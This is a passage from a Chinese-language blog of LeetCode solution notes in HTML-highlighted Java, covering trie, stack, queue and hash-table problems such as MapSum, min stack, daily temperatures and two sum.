class="keyword">char</span> val;</span><br><span class="line">        TrieNode[] children;</span><br><span class="line">        <span class="comment">//初始化节点，为当前节点赋值，并生成大小为27的数组，前26个用于存放子节点，第27个来代表是否为叶子节点。</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">TrieNode</span><span class="params">(<span class="keyword">char</span> val)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.val = val;</span><br><span class="line">            children = <span class="keyword">new</span> TrieNode[<span class="number">27</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Initialize your data structure here.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="comment">//用&#x27;0&#x27;来代表当前为叶子节点。</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Trie</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        root = <span class="keyword">new</span> TrieNode(<span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Inserts a word into the trie.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">insert</span><span class="params">(String word)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> length = word.length();</span><br><span class="line">        TrieNode node = root;</span><br><span class="line">        <span class="comment">//构造一个以字符串长度为深度的树</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; length; i++) &#123;</span><br><span class="line">            <span class="keyword">char</span> c = word.charAt(i);</span><br><span class="line">            <span class="keyword">int</span> position = c - <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">            <span class="comment">//如果当前还不存在该节点，构造该节点</span></span><br><span class="line">            <span class="keyword">if</span> (node.children[position] == <span class="keyword">null</span>) &#123;</span><br><span class="line">                node.children[position] = <span class="keyword">new</span> TrieNode(c);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//指针向下层移动</span></span><br><span class="line">            node = node.children[position];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//设置为叶子结点</span></span><br><span class="line">        node.children[<span class="number">26</span>] = <span class="keyword">new</span> TrieNode(<span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Returns if the word is in the trie.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">search</span><span class="params">(String word)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> length = word.length();</span><br><span class="line">        TrieNode node = root;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; length; i++) &#123;</span><br><span class="line">            <span class="keyword">char</span> c = word.charAt(i);</span><br><span class="line">            <span class="keyword">int</span> position = c - <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">            <span class="comment">//搜索到一半树中止了，false</span></span><br><span class="line">            <span class="keyword">if</span> (node.children[position] == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">//向下层遍历</span></span><br><span class="line">                node = node.children[position];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//看是否是叶子节点</span></span><br><span class="line">        <span class="keyword">if</span> (node.children[<span class="number">26</span>] != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Returns if there is any word in the trie that starts with the given prefix.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">startsWith</span><span class="params">(String prefix)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> length = prefix.length();</span><br><span class="line">        TrieNode node = root;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; length; i++) &#123;</span><br><span class="line">            <span class="keyword">char</span> c = prefix.charAt(i);</span><br><span class="line">            <span class="keyword">int</span> position = c - <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (node.children[position] == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                node = node.children[position];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="29-实现一个-trie用来求前缀和"><a class="markdownIt-Anchor" href="#29-实现一个-trie用来求前缀和"></a> 29. 实现一个 Trie，用来求前缀和</h3><p>  <a href="https://leetcode-cn.com/problems/map-sum-pairs/">https://leetcode-cn.com/problems/map-sum-pairs/</a></p><h4 id="思路-115"><a class="markdownIt-Anchor" href="#思路-115"></a> 思路</h4><p>  与上题类似，本质是构造一个字典树，本次对于每个节点都构造一个变量存放当前的sum值，父节点在遍历时与先前值进行累加，即可得到以当前父节点为前缀的总和。<br />  在插入时先检索是否有完全匹配的路径，有的话需要先剪掉当前值再累和，从而实现覆盖。</p><h4 id="代码-113"><a class="markdownIt-Anchor" href="#代码-113"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MapSum</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> TrieNode root;</span><br><span class="line">    <span class="comment">//定义字典类的数据结构</span></span><br><span class="line">    <span class="keyword">private</span> <span class="class"><span class="keyword">class</span> <span class="title">TrieNode</span> </span>&#123;</span><br><span class="line">        <span class="keyword">char</span> val;</span><br><span class="line">        <span class="keyword">int</span> cursum;</span><br><span class="line">        TrieNode[] children;</span><br><span class="line">        <span class="comment">//初始化节点，为当前节点赋值，并生成大小为27的数组，前26个用于存放子节点，第27个来代表是否为叶子节点。</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">TrieNode</span><span class="params">(<span class="keyword">char</span> val,<span class="keyword">int</span> sum)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.val = val;</span><br><span class="line">            <span class="keyword">this</span>.cursum=sum;</span><br><span class="line">            children = <span class="keyword">new</span> TrieNode[<span class="number">27</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/** Initialize your data structure here. */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MapSum</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        root = <span class="keyword">new</span> TrieNode(<span class="string">&#x27;0&#x27;</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">insert</span><span class="params">(String key, <span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> curval=search(key);        </span><br><span class="line">        <span class="keyword">int</span> length = key.length();</span><br><span class="line">        TrieNode node = root;</span><br><span class="line">        <span class="comment">//构造一个以字符串长度为深度的树</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; length; i++) &#123;</span><br><span class="line">            <span class="keyword">char</span> c = key.charAt(i);</span><br><span class="line">            <span class="keyword">int</span> position = c - <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">            <span class="comment">//如果当前还不存在该节点，构造该节点</span></span><br><span class="line">            <span class="keyword">if</span> (node.children[position] == <span class="keyword">null</span>) &#123;</span><br><span class="line">                node.children[position] = <span class="keyword">new</span> TrieNode(c,val);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                node.children[position].cursum+=val-curval;</span><br><span class="line">            <span class="comment">//指针向下层移动</span></span><br><span class="line">            node = node.children[position];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//设置为叶子结点</span></span><br><span class="line">        node.children[<span class="number">26</span>] = <span class="keyword">new</span> TrieNode(<span class="string">&#x27;0&#x27;</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">sum</span><span class="params">(String prefix)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> length = prefix.length();</span><br><span class="line">        TrieNode node = root;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; length; i++) &#123;</span><br><span class="line">            <span class="keyword">char</span> c = prefix.charAt(i);</span><br><span class="line">            <span class="keyword">int</span> position = c - <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (node.children[position] == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                node = node.children[position];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> node.cursum;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">search</span><span class="params">(String word)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> length = word.length();</span><br><span class="line">        TrieNode node = root;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; length; i++) &#123;</span><br><span class="line">            <span class="keyword">char</span> c = word.charAt(i);</span><br><span class="line">            <span class="keyword">int</span> position = c - <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">            <span class="comment">//搜索到一半树中止了，false</span></span><br><span class="line">            <span class="keyword">if</span> (node.children[position] == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">//向下层遍历</span></span><br><span class="line">                node = node.children[position];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//看是否是叶子节点</span></span><br><span class="line">        <span class="keyword">if</span> (node.children[<span class="number">26</span>] != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> node.cursum;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="三-栈和队列"><a class="markdownIt-Anchor" href="#三-栈和队列"></a> 三、栈和队列</h2><h3 id="1-用栈实现队列"><a class="markdownIt-Anchor" href="#1-用栈实现队列"></a> 1. 用栈实现队列</h3><p>  <a href="https://leetcode-cn.com/problems/implement-queue-using-stacks/">https://leetcode-cn.com/problems/implement-queue-using-stacks/</a></p><h4 id="思路-116"><a class="markdownIt-Anchor" href="#思路-116"></a> 思路</h4><p>  队列的特性是先进先出，而栈是先进后出，所以在出栈时需要先颠倒原栈顺序。</p><h4 id="代码-114"><a class="markdownIt-Anchor" href="#代码-114"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyQueue</span> </span>&#123;</span><br><span class="line">    Stack&lt;Integer&gt; que=<span class="keyword">new</span> Stack&lt;&gt;();</span><br><span class="line">    Stack&lt;Integer&gt; sup=<span class="keyword">new</span> Stack&lt;&gt;();</span><br><span class="line">    <span class="comment">/** Initialize your data structure here. */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MyQueue</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/** Push element x to the back of queue. */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">push</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">        sup.push(x);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/** Removes the element from in front of queue and returns that element. */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">pop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        reverse();</span><br><span class="line">        <span class="keyword">return</span> que.pop();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/** Get the front element. */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">peek</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        reverse();</span><br><span class="line">        <span class="keyword">return</span> que.peek();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/** Returns whether the queue is empty. */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">empty</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> que.isEmpty()&amp;&amp;sup.isEmpty();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">reverse</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (que.isEmpty()) &#123;</span><br><span class="line">             <span class="keyword">while</span>(!sup.isEmpty())</span><br><span class="line">            &#123;</span><br><span class="line">                que.push(sup.pop());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-用队列实现栈"><a class="markdownIt-Anchor" href="#2-用队列实现栈"></a> 2. 用队列实现栈</h3><p>  <a href="https://leetcode-cn.com/problems/implement-stack-using-queues/">https://leetcode-cn.com/problems/implement-stack-using-queues/</a></p><h4 id="思路-117"><a class="markdownIt-Anchor" href="#思路-117"></a> 思路</h4><p>  新插入元素之后，将除了新元素之外的所有元素都出队列再入队列，即可以维护顺序。<br />  <code>就是这些函数名不太好记</code></p><h4 id="代码-115"><a class="markdownIt-Anchor" href="#代码-115"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyStack</span> </span>&#123;</span><br><span class="line">    Queue&lt;Integer&gt; que=<span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">    <span class="comment">/** Initialize your data structure here. */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MyStack</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/** Push element x onto stack. */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">push</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> cursize=que.size();</span><br><span class="line">        que.add(x);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;cursize;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            que.add(que.poll());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/** Removes the element on top of the stack and returns that element. */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">pop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> que.remove();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/** Get the top element. */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">top</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> que.peek();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/** Returns whether the stack is empty. */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">empty</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> que.isEmpty();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-最小值栈"><a class="markdownIt-Anchor" href="#3-最小值栈"></a> 3. 最小值栈</h3><p>  <a href="https://leetcode-cn.com/problems/min-stack/">https://leetcode-cn.com/problems/min-stack/</a></p><h4 id="思路-118"><a class="markdownIt-Anchor" href="#思路-118"></a> 思路</h4><p>  维护一个最小值栈，然后每次push的时候同步push当前最小值，pop的时候也同步pop即可。</p><h4 id="代码-116"><a class="markdownIt-Anchor" href="#代码-116"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MinStack</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Stack&lt;Integer&gt; dataStack=<span class="keyword">new</span> Stack&lt;&gt;();</span><br><span class="line">    <span class="keyword">private</span> Stack&lt;Integer&gt; minStack=<span class="keyword">new</span> Stack&lt;&gt;();</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> min;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MinStack</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        min = Integer.MAX_VALUE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">push</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">        dataStack.add(x);</span><br><span class="line">        min = Math.min(min, x);</span><br><span class="line">        minStack.add(min);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">pop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        dataStack.pop();</span><br><span class="line">        minStack.pop();</span><br><span class="line">        min = minStack.isEmpty() ? Integer.MAX_VALUE : minStack.peek();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">top</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> dataStack.peek();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getMin</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> minStack.peek();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-用栈实现括号匹配"><a class="markdownIt-Anchor" href="#4-用栈实现括号匹配"></a> 4. 用栈实现括号匹配</h3><p>  <a href="https://leetcode-cn.com/problems/valid-parentheses/">https://leetcode-cn.com/problems/valid-parentheses/</a></p><h4 id="思路-119"><a class="markdownIt-Anchor" href="#思路-119"></a> 思路</h4><p>  左括号push入栈，右括号则将元素pop出栈进行比较，能够配对则成功，不能则失败。</p><h4 id="代码-117"><a class="markdownIt-Anchor" href="#代码-117"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isValid</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        Stack&lt;Character&gt; st=<span class="keyword">new</span> Stack&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;s.length();i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">char</span> ch=s.charAt(i);</span><br><span class="line">            <span class="keyword">if</span>(ch==<span class="string">&#x27;(&#x27;</span>||ch==<span class="string">&#x27;[&#x27;</span>||ch==<span class="string">&#x27;&#123;&#x27;</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                st.push(ch);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(ch==<span class="string">&#x27;)&#x27;</span>||ch==<span class="string">&#x27;]&#x27;</span>||ch==<span class="string">&#x27;&#125;&#x27;</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span>(st.isEmpty())</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">                    <span class="keyword">char</span> cur=st.pop();</span><br><span class="line">                    <span class="keyword">if</span>(ch==<span class="string">&#x27;)&#x27;</span>&amp;&amp;cur!=<span class="string">&#x27;(&#x27;</span>)</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">                    <span class="keyword">if</span>(ch==<span class="string">&#x27;]&#x27;</span>&amp;&amp;cur!=<span class="string">&#x27;[&#x27;</span>)</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">                    <span class="keyword">if</span>(ch==<span class="string">&#x27;&#125;&#x27;</span>&amp;&amp;cur!=<span class="string">&#x27;&#123;&#x27;</span>)</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(st.isEmpty())</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5-数组中元素与下一个比它大的元素之间的距离"><a class="markdownIt-Anchor" href="#5-数组中元素与下一个比它大的元素之间的距离"></a> 5. 数组中元素与下一个比它大的元素之间的距离</h3><p>  <a href="https://leetcode-cn.com/problems/daily-temperatures/">https://leetcode-cn.com/problems/daily-temperatures/</a></p><h4 id="思路-120"><a class="markdownIt-Anchor" href="#思路-120"></a> 思路</h4><p>  维护一个递减栈，在遍历数组的同时进行维护，如果当前遍历的元素:</p><ol><li>小于栈顶元素，那么就入栈，从而保证了栈内元素在目前为止没有在各自的位置后面找到比他们大的数。</li><li>大于栈顶元素，那么就开始出栈，意味着当前所遍历的元素，对于所有因为小于他而出栈的元素而言，都是第一次遇到的比他们大的数。两者下标相减，就可以获得天数差值,最后将当前元素入栈。</li><li>最后的元素位置应该用0代替，遍历之后还未出栈的元素，说明没有比他大的元素，也要用0代替，但是数组初始化为0，不用再多赋值。</li></ol><h4 id="代码-118"><a class="markdownIt-Anchor" href="#代码-118"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[] dailyTemperatures(<span class="keyword">int</span>[] T) &#123;</span><br><span class="line">        <span class="keyword">int</span>[] res=<span class="keyword">new</span> <span class="keyword">int</span>[T.length];</span><br><span class="line">        Stack&lt;Integer&gt; supStack=<span class="keyword">new</span> Stack&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;T.length;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(supStack.isEmpty()||T[i]&lt;=T[supStack.peek()])</span><br><span class="line">               supStack.push(i);</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">while</span>(!supStack.isEmpty()&amp;&amp;T[i]&gt;T[supStack.peek()])</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">int</span> index=supStack.pop();</span><br><span class="line">                    res[index]=i-index;</span><br><span class="line">                &#125;</span><br><span class="line">                supStack.push(i);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="6-循环数组中比当前元素大的下一个元素"><a class="markdownIt-Anchor" href="#6-循环数组中比当前元素大的下一个元素"></a> 6. 循环数组中比当前元素大的下一个元素</h3><p>  <a href="https://leetcode-cn.com/problems/next-greater-element-ii/">https://leetcode-cn.com/problems/next-greater-element-ii/</a></p><h4 id="思路-121"><a class="markdownIt-Anchor" href="#思路-121"></a> 思路</h4><p>  和上题类似，只是本题需要将待检测数组重复一遍用来实现循环比较，并且在数组中不再保存下标差而是实际值。</p><h4 id="代码-119"><a class="markdownIt-Anchor" href="#代码-119"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[] nextGreaterElements(<span class="keyword">int</span>[] nums) &#123;</span><br><span class="line">        <span class="keyword">int</span>[] res=<span class="keyword">new</span> <span class="keyword">int</span>[nums.length];</span><br><span class="line">        Arrays.fill(res,-<span class="number">1</span>);</span><br><span class="line">        Stack&lt;Integer&gt; supStack=<span class="keyword">new</span> Stack&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;nums.length*<span class="number">2</span>;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> realindex=i%nums.length;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span>(supStack.isEmpty()||nums[realindex]&lt;nums[supStack.peek()])</span><br><span class="line">               supStack.push(realindex);</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">while</span>(!supStack.isEmpty()&amp;&amp;nums[realindex]&gt;nums[supStack.peek()])</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">int</span> index=supStack.pop();</span><br><span class="line">                    res[index]=nums[realindex];</span><br><span class="line">                &#125;</span><br><span class="line">                supStack.push(realindex);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="四-哈希表"><a class="markdownIt-Anchor" href="#四-哈希表"></a> 四、哈希表</h2><h3 id="1-数组中两个数的和为给定值"><a class="markdownIt-Anchor" href="#1-数组中两个数的和为给定值"></a> 1. 数组中两个数的和为给定值</h3><p>  <a href="https://leetcode-cn.com/problems/two-sum/">https://leetcode-cn.com/problems/two-sum/</a></p><h4 id="思路-122"><a class="markdownIt-Anchor" href="#思路-122"></a> 思路</h4><p>  可以先对数组进行排序，然后使用双指针方法或者二分查找方法。这样做的时间复杂度为 O(NlogN)，空间复杂度为 O(1)。</p><p>  用 HashMap 存储数组元素和索引的映射，在访问到 nums[i] 时，判断 HashMap 中是否存在 target - nums[i]，如果存在说明 target - nums[i] 所在的索引和 i 就是要找的两个数。该方法的时间复杂度为 O(N)，空间复杂度为 O(N)，使用空间来换取时间。</p><h4 id="代码-120"><a class="markdownIt-Anchor" href="#代码-120"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[] twoSum(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> target) &#123;</span><br><span class="line">        HashMap&lt;Integer,Integer&gt; index=<span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;nums.length;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(index.containsKey(target-nums[i]))</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;i,index.get(target-nums[i])&#125;;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                index.put(nums[i],i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-判断数组是否含有重复元素"><a class="markdownIt-Anchor" href="#2-判断数组是否含有重复元素"></a> 2. 判断数组是否含有重复元素</h3><p>  <a href="https://leetcode-cn.com/problems/contains-duplicate/">https://leetcode-cn.com/problems/contains-duplicate/</a></p><h4 id="思路-123"><a class="markdownIt-Anchor" href="#思路-123"></a> 思路</h4><p>  利用HashSet不保存重复元素的特性，每个元素都保存一次，最后看Set的大小。</p><h4 id="代码-121"><a class="markdownIt-Anchor" href="#代码-121"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">containsDuplicate</span><span class="params">(<span class="keyword">int</span>[] nums)</span> 